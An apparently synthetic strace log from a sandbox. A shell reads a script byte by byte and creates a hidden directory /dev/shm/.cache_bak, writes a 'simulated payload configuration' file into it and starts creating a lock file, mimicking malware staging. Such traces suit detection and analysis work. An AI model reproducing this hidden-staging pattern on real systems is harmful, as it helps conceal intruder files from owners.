9     14:56:49.045152 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.045487 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.045824 read(0<pipe:[589]>, "h", 1) = 1
9     14:56:49.046154 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.046609 read(0<pipe:[589]>, "_", 1) = 1
9     14:56:49.047034 read(0<pipe:[589]>, "b", 1) = 1
9     14:56:49.047415 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.047788 read(0<pipe:[589]>, "k", 1) = 1
9     14:56:49.048132 read(0<pipe:[589]>, "\n", 1) = 1
9     14:56:49.048571 newfstatat(AT_FDCWD</sandbox>, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
9     14:56:49.049056 newfstatat(AT_FDCWD</sandbox>, "/usr/local/sbin/mkdir", 0x7fff19398d60, 0) = -1 ENOENT (No such file or directory)
9     14:56:49.049536 newfstatat(AT_FDCWD</sandbox>, "/usr/local/bin/mkdir", 0x7fff19398d60, 0) = -1 ENOENT (No such file or directory)
9     14:56:49.050000 newfstatat(AT_FDCWD</sandbox>, "/usr/sbin/mkdir", 0x7fff19398d60, 0) = -1 ENOENT (No such file or directory)
9     14:56:49.050359 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/mkdir", {st_mode=S_IFREG|0755, st_size=76296, ...}, 0) = 0
9     14:56:49.050757 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/mkdir", {st_mode=S_IFREG|0755, st_size=76296, ...}, 0) = 0
9     14:56:49.051107 geteuid()         = 1001
9     14:56:49.051493 getegid()         = 1001
9     14:56:49.051837 getuid()          = 1001
9     14:56:49.052186 getgid()          = 1001
9     14:56:49.052512 access("/usr/bin/mkdir", X_OK) = 0
9     14:56:49.052847 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/mkdir", {st_mode=S_IFREG|0755, st_size=76296, ...}, 0) = 0
9     14:56:49.053193 geteuid()         = 1001
9     14:56:49.053515 getegid()         = 1001
9     14:56:49.053835 getuid()          = 1001
9     14:56:49.054153 getgid()          = 1001
9     14:56:49.054472 access("/usr/bin/mkdir", R_OK) = 0
9     14:56:49.054809 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     14:56:49.055132 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD], [], 8) = 0
9     14:56:49.055430 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x79f014237e50) = 19
9     14:56:49.056032 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
19    14:56:49.056185 set_robust_list(0x79f014237e60, 24 <unfinished ...>
9     14:56:49.056350 <... rt_sigprocmask resumed>NULL, 8) = 0
19    14:56:49.056539 <... set_robust_list resumed>) = 0
9     14:56:49.056898 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
19    14:56:49.057276 getpid( <unfinished ...>
9     14:56:49.057499 <... rt_sigprocmask resumed>[], 8) = 0
19    14:56:49.057697 <... getpid resumed>) = 19
9     14:56:49.057912 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
19    14:56:49.058121 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
9     14:56:49.058313 <... rt_sigprocmask resumed>NULL, 8) = 0
19    14:56:49.058481 <... rt_sigprocmask resumed>NULL, 8) = 0
9     14:56:49.058700 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
19    14:56:49.058900 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330},  <unfinished ...>
9     14:56:49.059086 <... rt_sigprocmask resumed>[], 8) = 0
19    14:56:49.059279 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:49.059466 rt_sigaction(SIGINT, {sa_handler=0x63f00dda8750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330},  <unfinished ...>
19    14:56:49.059643 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330},  <unfinished ...>
9     14:56:49.059807 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
19    14:56:49.059980 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:49.060157 wait4(-1,  <unfinished ...>
19    14:56:49.060316 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
19    14:56:49.060713 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
19    14:56:49.061133 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
19    14:56:49.061516 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x79f01427e330}, {sa_handler=0x63f00dda6230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x79f01427e330}, 8) = 0
19    14:56:49.061909 execve("/usr/bin/mkdir", ["mkdir", "-p", "/dev/shm/.cache_bak"], 0x63f037b0d640 /* 9 vars */) = 0
19    14:56:49.062785 brk(NULL)         = 0x63dd5866d000
19    14:56:49.063174 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7580ad0a5000
19    14:56:49.063533 openat(AT_FDCWD</sandbox>, "/lib/libfake_tracer.so", O_RDONLY|O_CLOEXEC) = 3</usr/lib/libfake_tracer.so>
19    14:56:49.064209 read(3</usr/lib/libfake_tracer.so>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
19    14:56:49.064664 fstat(3</usr/lib/libfake_tracer.so>, {st_mode=S_IFREG|0777, st_size=16376, ...}) = 0
19    14:56:49.065179 mmap(NULL, 19160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0) = 0x7580ad0a0000
19    14:56:49.065518 mmap(0x7580ad0a1000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x1000) = 0x7580ad0a1000
19    14:56:49.065867 mmap(0x7580ad0a2000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x7580ad0a2000
19    14:56:49.066220 mmap(0x7580ad0a3000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x7580ad0a3000
19    14:56:49.066637 close(3</usr/lib/libfake_tracer.so>) = 0
19    14:56:49.067104 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
19    14:56:49.067503 openat(AT_FDCWD</sandbox>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3</etc/ld.so.cache>
19    14:56:49.067868 fstat(3</etc/ld.so.cache>, {st_mode=S_IFREG|0644, st_size=7295, ...}) = 0
19    14:56:49.068242 mmap(NULL, 7295, PROT_READ, MAP_PRIVATE, 3</etc/ld.so.cache>, 0) = 0x7580ad09e000
19    14:56:49.068580 close(3</etc/ld.so.cache>) = 0
19    14:56:49.068920 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libselinux.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libselinux.so.1>
19    14:56:49.069358 read(3</usr/lib/x86_64-linux-gnu/libselinux.so.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
19    14:56:49.069729 fstat(3</usr/lib/x86_64-linux-gnu/libselinux.so.1>, {st_mode=S_IFREG|0644, st_size=174472, ...}) = 0
19    14:56:49.070092 mmap(NULL, 181960, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libselinux.so.1>, 0) = 0x7580ad071000
19    14:56:49.070429 mmap(0x7580ad077000, 118784, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libselinux.so.1>, 0x6000) = 0x7580ad077000
19    14:56:49.070795 mmap(0x7580ad094000, 24576, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libselinux.so.1>, 0x23000) = 0x7580ad094000
19    14:56:49.071168 mmap(0x7580ad09a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libselinux.so.1>, 0x29000) = 0x7580ad09a000
19    14:56:49.071513 mmap(0x7580ad09c000, 5832, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7580ad09c000
19    14:56:49.071847 close(3</usr/lib/x86_64-linux-gnu/libselinux.so.1>) = 0
19    14:56:49.072199 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
19    14:56:49.072561 read(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
19    14:56:49.072890 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
19    14:56:49.073358 fstat(3</usr/lib/x86_64-linux-gnu/libc.so.6>, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
19    14:56:49.073898 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
19    14:56:49.074379 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0) = 0x7580ace5f000
19    14:56:49.074789 mmap(0x7580ace87000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x28000) = 0x7580ace87000
19    14:56:49.075189 mmap(0x7580ad00f000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1b0000) = 0x7580ad00f000
19    14:56:49.075547 mmap(0x7580ad05e000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1fe000) = 0x7580ad05e000
19    14:56:49.075898 mmap(0x7580ad064000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7580ad064000
19    14:56:49.076265 close(3</usr/lib/x86_64-linux-gnu/libc.so.6>) = 0
19    14:56:49.076624 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libpcre2-8.so.0", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>
19    14:56:49.077038 read(3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
19    14:56:49.077399 fstat(3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>, {st_mode=S_IFREG|0644, st_size=625344, ...}) = 0
19    14:56:49.077741 mmap(NULL, 627472, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>, 0) = 0x7580acdc5000
19    14:56:49.078079 mmap(0x7580acdc7000, 450560, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>, 0x2000) = 0x7580acdc7000
19    14:56:49.078446 mmap(0x7580ace35000, 163840, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>, 0x70000) = 0x7580ace35000
19    14:56:49.078825 mmap(0x7580ace5d000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>, 0x97000) = 0x7580ace5d000
19    14:56:49.079178 close(3</usr/lib/x86_64-linux-gnu/libpcre2-8.so.0.11.2>) = 0
19    14:56:49.079575 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7580acdc3000
19    14:56:49.079911 arch_prctl(ARCH_SET_FS, 0x7580acdc3dc0) = 0
19    14:56:49.080224 set_tid_address(0x7580acdc4090) = 19
19    14:56:49.080546 set_robust_list(0x7580acdc40a0, 24) = 0
19    14:56:49.080909 rseq(0x7580acdc46e0, 0x20, 0, 0x53053053) = 0
19    14:56:49.081321 mprotect(0x7580ad05e000, 16384, PROT_READ) = 0
19    14:56:49.081647 mprotect(0x7580ace5d000, 4096, PROT_READ) = 0
19    14:56:49.082037 mprotect(0x7580ad09a000, 4096, PROT_READ) = 0
19    14:56:49.082415 mprotect(0x7580ad0a3000, 4096, PROT_READ) = 0
19    14:56:49.082791 mprotect(0x63dd27c9c000, 4096, PROT_READ) = 0
19    14:56:49.083123 mprotect(0x7580ad0dd000, 8192, PROT_READ) = 0
19    14:56:49.083504 prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
19    14:56:49.083864 munmap(0x7580ad09e000, 7295) = 0
19    14:56:49.084255 statfs("/sys/fs/selinux", {f_type=SYSFS_MAGIC, f_bsize=4096, f_blocks=0, f_bfree=0, f_bavail=0, f_files=0, f_ffree=0, f_fsid={val=[0xe68224ab, 0x73813531]}, f_namelen=255, f_frsize=4096, f_flags=ST_VALID|ST_RDONLY|ST_NOSUID|ST_NODEV|ST_NOEXEC|ST_RELATIME}) = 0
19    14:56:49.084639 statfs("/selinux", 0x7fff30425ee0) = -1 ENOENT (No such file or directory)
19    14:56:49.085036 getrandom("\x8b\x0e\x0a\xf9\xc8\xc6\xd2\x0b", 8, GRND_NONBLOCK) = 8
19    14:56:49.085373 brk(NULL)         = 0x63dd5866d000
19    14:56:49.085693 brk(0x63dd5868e000) = 0x63dd5868e000
19    14:56:49.086030 openat(AT_FDCWD</sandbox>, "/proc/filesystems", O_RDONLY|O_CLOEXEC) = 3</proc/filesystems>
19    14:56:49.086390 fstat(3</proc/filesystems>, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
19    14:56:49.086795 read(3</proc/filesystems>, "nodev\tsysfs\nnodev\ttmpfs\nnodev\tbd"..., 1024) = 440
19    14:56:49.087182 close(3</proc/filesystems>) = 0
19    14:56:49.087516 openat(AT_FDCWD</sandbox>, "/proc/mounts", O_RDONLY|O_CLOEXEC) = 3</proc/19/mounts>
19    14:56:49.087882 fstat(3</proc/19/mounts>, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
19    14:56:49.088214 read(3</proc/19/mounts>, "overlay / overlay rw,relatime,lo"..., 1024) = 1024
19    14:56:49.088578 read(3</proc/19/mounts>, "r.v1.overlayfs/snapshots/1355/fs"..., 1024) = 1024
19    14:56:49.088935 read(3</proc/19/mounts>, ",msize=65536,trans=fd,rfd=5,wfd="..., 1024) = 891
19    14:56:49.089316 read(3</proc/19/mounts>, "", 1024) = 0
19    14:56:49.089642 close(3</proc/19/mounts>) = 0
19    14:56:49.090122 access("/etc/selinux/config", F_OK) = -1 ENOENT (No such file or directory)
19    14:56:49.091075 umask(000)        = 022
19    14:56:49.091569 umask(022)        = 000
19    14:56:49.092053 mkdir("/dev", 0777) = -1 EEXIST (File exists)
19    14:56:49.092568 chdir("/dev")     = 0
19    14:56:49.093026 mkdir("shm", 0777) = -1 EEXIST (File exists)
19    14:56:49.093451 chdir("shm")      = 0
19    14:56:49.093808 mkdir(".cache_bak", 0777) = 0
19    14:56:49.094248 close(1<pipe:[2809]>) = 0
19    14:56:49.094647 close(2<pipe:[2810]>) = 0
19    14:56:49.095028 exit_group(0)     = ?
19    14:56:49.095796 +++ exited with 0 +++
9     14:56:49.095936 <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 19
9     14:56:49.096134 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=0x63f00dda8750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:49.096483 ioctl(2<pipe:[2810]>, TIOCGWINSZ, 0x7fff19398f90) = -1 ENOTTY (Inappropriate ioctl for device)
9     14:56:49.096866 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     14:56:49.097217 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=19, si_uid=1001, si_status=0, si_utime=0, si_stime=1 /* 0.01 s */} ---
9     14:56:49.097398 wait4(-1, 0x7fff19398910, WNOHANG, NULL) = -1 ECHILD (No child processes)
9     14:56:49.097718 rt_sigreturn({mask=[]}) = 0
9     14:56:49.098080 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.098428 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.098768 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.099115 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.099470 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.099810 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.100159 read(0<pipe:[589]>, "h", 1) = 1
9     14:56:49.100510 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.100818 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.101186 read(0<pipe:[589]>, "\"", 1) = 1
9     14:56:49.101529 read(0<pipe:[589]>, "S", 1) = 1
9     14:56:49.101856 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:49.102167 read(0<pipe:[589]>, "m", 1) = 1
9     14:56:49.102501 read(0<pipe:[589]>, "u", 1) = 1
9     14:56:49.102814 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.103110 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.103406 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.103721 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.104016 read(0<pipe:[589]>, "d", 1) = 1
9     14:56:49.104324 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.104618 read(0<pipe:[589]>, "p", 1) = 1
9     14:56:49.104912 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.105201 read(0<pipe:[589]>, "y", 1) = 1
9     14:56:49.105493 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.105854 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.106212 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.106562 read(0<pipe:[589]>, "d", 1) = 1
9     14:56:49.107088 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.107454 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.107838 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.108134 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.108416 read(0<pipe:[589]>, "f", 1) = 1
9     14:56:49.108694 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:49.108996 read(0<pipe:[589]>, "g", 1) = 1
9     14:56:49.109322 read(0<pipe:[589]>, "u", 1) = 1
9     14:56:49.109620 read(0<pipe:[589]>, "r", 1) = 1
9     14:56:49.109915 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.110209 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.110514 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:49.110887 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.111216 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.111540 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.111866 read(0<pipe:[589]>, "d", 1) = 1
9     14:56:49.112189 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.112512 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.112835 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.113158 read(0<pipe:[589]>, "\"", 1) = 1
9     14:56:49.113482 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.113805 read(0<pipe:[589]>, ">", 1) = 1
9     14:56:49.114269 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.114629 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.114955 read(0<pipe:[589]>, "d", 1) = 1
9     14:56:49.115280 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.115605 read(0<pipe:[589]>, "v", 1) = 1
9     14:56:49.115931 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.116255 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.116601 read(0<pipe:[589]>, "h", 1) = 1
9     14:56:49.116982 read(0<pipe:[589]>, "m", 1) = 1
9     14:56:49.117345 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.117675 read(0<pipe:[589]>, ".", 1) = 1
9     14:56:49.118001 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.118330 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.118666 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.119000 read(0<pipe:[589]>, "h", 1) = 1
9     14:56:49.119329 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.119655 read(0<pipe:[589]>, "_", 1) = 1
9     14:56:49.120017 read(0<pipe:[589]>, "b", 1) = 1
9     14:56:49.120342 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.120669 read(0<pipe:[589]>, "k", 1) = 1
9     14:56:49.121034 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.121365 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.121705 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.122239 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.122617 read(0<pipe:[589]>, "f", 1) = 1
9     14:56:49.123095 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:49.123754 read(0<pipe:[589]>, "g", 1) = 1
9     14:56:49.124182 read(0<pipe:[589]>, ".", 1) = 1
9     14:56:49.124683 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.125094 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.125478 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.125856 read(0<pipe:[589]>, "f", 1) = 1
9     14:56:49.126242 read(0<pipe:[589]>, "\n", 1) = 1
9     14:56:49.126771 openat(AT_FDCWD</sandbox>, "/dev/shm/.cache_bak/config.conf", O_WRONLY|O_CREAT|O_TRUNC, 000) = 3</dev/shm/.cache_bak/config.conf>
9     14:56:49.127245 fcntl(1<pipe:[2809]>, F_GETFD) = 0
9     14:56:49.127682 fcntl(1<pipe:[2809]>, F_DUPFD, 10) = 10<pipe:[2809]>
9     14:56:49.128047 fcntl(1<pipe:[2809]>, F_GETFD) = 0
9     14:56:49.128433 fcntl(10<pipe:[2809]>, F_SETFD, FD_CLOEXEC) = 0
9     14:56:49.128880 dup2(3</dev/shm/.cache_bak/config.conf>, 1<pipe:[2809]>) = 1</dev/shm/.cache_bak/config.conf>
9     14:56:49.129295 close(3</dev/shm/.cache_bak/config.conf>) = 0
9     14:56:49.129683 fstat(1</dev/shm/.cache_bak/config.conf>, {st_mode=S_IFREG|000, st_size=0, ...}) = 0
9     14:56:49.130104 write(1</dev/shm/.cache_bak/config.conf>, "Simulated payload configuration "..., 37) = 37
9     14:56:49.130474 dup2(10<pipe:[2809]>, 1</dev/shm/.cache_bak/config.conf>) = 1<pipe:[2809]>
9     14:56:49.130874 fcntl(10<pipe:[2809]>, F_GETFD) = 0x1 (flags FD_CLOEXEC)
9     14:56:49.131217 close(10<pipe:[2809]>) = 0
9     14:56:49.131560 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.131898 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.132232 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.132564 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.132897 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.133230 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.133561 read(0<pipe:[589]>, "u", 1) = 1
9     14:56:49.133892 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.134224 read(0<pipe:[589]>, "h", 1) = 1
9     14:56:49.134557 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.134937 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.135267 read(0<pipe:[589]>, "d", 1) = 1
9     14:56:49.135611 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.135944 read(0<pipe:[589]>, "v", 1) = 1
9     14:56:49.136273 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.136640 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.137041 read(0<pipe:[589]>, "h", 1) = 1
9     14:56:49.137393 read(0<pipe:[589]>, "m", 1) = 1
9     14:56:49.137767 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.138102 read(0<pipe:[589]>, ".", 1) = 1
9     14:56:49.138440 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.138803 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.139153 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.139486 read(0<pipe:[589]>, "h", 1) = 1
9     14:56:49.139836 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.140417 read(0<pipe:[589]>, "_", 1) = 1
9     14:56:49.140903 read(0<pipe:[589]>, "b", 1) = 1
9     14:56:49.141270 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.141606 read(0<pipe:[589]>, "k", 1) = 1
9     14:56:49.141995 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.142345 read(0<pipe:[589]>, "u", 1) = 1
9     14:56:49.142694 read(0<pipe:[589]>, "p", 1) = 1
9     14:56:49.143032 read(0<pipe:[589]>, "d", 1) = 1
9     14:56:49.143368 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.143719 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.144057 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.144391 read(0<pipe:[589]>, ".", 1) = 1
9     14:56:49.144723 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.145056 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.145387 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.145718 read(0<pipe:[589]>, "k", 1) = 1
9     14:56:49.146050 read(0<pipe:[589]>, "\n", 1) = 1
9     14:56:49.146414 newfstatat(AT_FDCWD</sandbox>, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
9     14:56:49.146834 newfstatat(AT_FDCWD</sandbox>, "/usr/local/sbin/touch", 0x7fff19398d60, 0) = -1 ENOENT (No such file or directory)
9     14:56:49.147199 newfstatat(AT_FDCWD</sandbox>, "/usr/local/bin/touch", 0x7fff19398d60, 0) = -1 ENOENT (No such file or directory)
9     14:56:49.147589 newfstatat(AT_FDCWD</sandbox>, "/usr/sbin/touch", 0x7fff19398d60, 0) = -1 ENOENT (No such file or directory)
9     14:56:49.147962 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/touch", {st_mode=S_IFREG|0755, st_size=96776, ...}, 0) = 0
9     14:56:49.148348 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/touch", {st_mode=S_IFREG|0755, st_size=96776, ...}, 0) = 0
9     14:56:49.148691 geteuid()         = 1001
9     14:56:49.149011 getegid()         = 1001
9     14:56:49.149329 getuid()          = 1001
9     14:56:49.149653 getgid()          = 1001
9     14:56:49.149974 access("/usr/bin/touch", X_OK) = 0
9     14:56:49.150304 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/touch", {st_mode=S_IFREG|0755, st_size=96776, ...}, 0) = 0
9     14:56:49.150664 geteuid()         = 1001
